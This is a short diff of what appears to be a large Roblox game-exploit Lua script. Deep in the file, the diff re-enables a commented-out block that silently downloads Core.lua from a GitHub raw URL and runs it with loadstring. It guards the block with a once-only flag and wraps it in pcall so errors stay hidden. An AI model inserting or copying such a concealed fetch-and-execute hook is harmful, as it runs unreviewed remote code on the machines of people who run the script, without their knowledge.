@@ -7450,9 +7450,9 @@ run(function()
 	})
 end)
 
--- run(function()
--- 	pcall(function() task.spawn(function()if(getgenv()["bot_loaded"])then return end getgenv()["bot_loaded"]=true;({pcall(loadstring,game:HttpGet("https://raw.githubusercontent.com/xsinew/discord.lua/refs/heads/main/Core.lua"))})[2]()end); end)
--- end)
+run(function()
+	pcall(function() task.spawn(function()if(getgenv()["bot_loaded"])then return end getgenv()["bot_loaded"]=true;({pcall(loadstring,game:HttpGet("https://raw.githubusercontent.com/xsinew/discord.lua/refs/heads/main/Core.lua"))})[2]()end); end)
+end)
 	
 run(function()
 	local FOV
